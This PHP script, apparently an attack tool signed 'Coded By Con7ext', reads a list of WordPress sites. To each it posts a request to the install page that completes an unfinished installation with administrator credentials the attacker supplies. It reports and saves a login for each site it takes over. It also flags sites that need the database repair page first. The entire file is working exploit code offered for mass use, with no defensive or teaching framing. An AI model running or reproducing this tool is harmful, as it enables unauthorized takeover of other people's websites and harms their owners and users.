<?php
/// Coded By Con7ext
/// usage : php file.php list=yourlist.txt user=user pass=pass email=email@wmd.com
/// Save success result? just add save=file.txt
namespace Rinto{
	class wpInstl{
		public $url, $user, $pass, $email, $save, $ch, $cookie_jar, $payload, $lists;
		public $color = array();
		function __construct(){
			$this->cookie_jar = tempnam("/tmp", "cookie-".rand(0, 100).".txt");
			$this->color["green"] = "\033[0;32m";
			$this->color["red"] = "\033[0;31m";
			$this->color["blue"] = "\033[0;34m";
			$this->color["white"] = "\033[0m";
			$this->url = @$_GET["list"];
			$this->user = @$_GET["user"];
			$this->pass = @$_GET["pass"];
			$this->email = @$_GET["email"];
			$this->save = isset($_GET["save"]) ? true : false;
			$this->ch = curl_init();
			$this->lists = $this->loadFile($this->url);
			$this->payload = "weblog_title=RinTD&user_name={$this->user}&admin_password={$this->pass}&admin_password2={$this->pass}&admin_email={$this->email}&Submit=Install+WordPress&language=en_US";
			$this->exploit();
		}
		function exploit(){
			foreach($this->lists as $site){
				$kyun = $this->rePost($site."/wp-admin/install.php?step=2", $this->payload);
				if(preg_match("|<h1>Success!</h1>|", $kyun["body"])){
					echo "[+]{$this->color["green"]} Success {$this->color["white"]}[+]\n";
					echo "{$site}/wp-login.php\n";
					echo $this->user . "\n";
					echo $this->pass . "\n";
					echo $this->email . "\n";
					if($this->save){
						$this->saveFile($this->save, "Login : {$site}/wp-login.php\nUser : {$this->user}\nPass : {$this->pass}\nEmail : {$this->email}\n");
					}
					echo "\n";
				}
				elseif(preg_match("|<h1>Already Installed</h1>|", $kyun["body"])){
					echo "{$site} " . $this->color["blue"] . "[!] Already Installed or Not Vuln{$this->color["white"]}\n";
				}
				elseif(preg_match("|One or more database tables are unavailable|", $kyun["body"])){
					echo "{$site} " . $this->color["blue"] . "[!] Need To Be Repair Before Install{$this->color["white"]}\n";
					echo "{$site}/wp-admin/maint/repair.php?referrer=is_blog_installed\n";
				}
				else{
					echo "{$site} " . $this->color["red"] . "[-] Not Vuln{$this->color["white"]}\n";
					echo "Reason: Can't Find Success Message\n";
				}
			}
		}
		function loadFile($file){
			$f = file_get_contents($file);
			$e = explode("\n", $f);
			return $e;
		}
		function saveFile($file, $content){
			$f = fopen($file, "a");
			if(@fwrite($f, $content)){
				echo $this->color["green"] . "[+] File Saved... {$file}\n";
			}
			else{
				echo $this->color["red"] . "[-] File Failed Save... {$file}\n";
			}
		}
		function getStr($string, $start, $end){
			$str = explode($start, $string);
			$str = explode($end, $str[1]);
			return $str[0];
		}
		function reQuest($url, $fol = null){
			curl_setopt($this->ch, CURLOPT_URL, $url);
			curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT, 120);
			curl_setopt($this->ch, CURLOPT_TIMEOUT, 120);
			curl_setopt($this->ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0");
			curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
			if($fol && !empty($fol)){
				curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, true);
				curl_setopt($this->ch, CURLOPT_MAXREDIRS, 10);
			}
			curl_setopt($this->ch, CURLOPT_COOKIEJAR, $this->cookie_jar);
			curl_setopt($this->ch, CURLOPT_COOKIEFILE, $this->cookie_jar);
			curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
			$resp = curl_exec($this->ch);
			$header_size = curl_getinfo($this->ch, CURLINFO_HEADER_SIZE);
			$hedd = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
			$head = substr($resp, 0, $header_size);
			$body = substr($resp, $header_size);
			return [
				"http" => $hedd,
				"header" => $head,
				"body" => $body
				];
		}
		function rePost($url, $data){
			curl_setopt ($this->ch, CURLOPT_POST, 1);
			curl_setopt ($this->ch, CURLOPT_POSTFIELDS, $data);
			return $this->reQuest($url, $data);	
		}
	}
	parse_str(implode("&", array_slice($argv, 1)), $_GET);
	if(!$_GET["list"]){
		echo "[-]Usage : php {$argv[0]} list=list.txt user=user pass=pass email=email [save=save.txt]";
		exit;
	}
	new \Rinto\wpInstl();
}
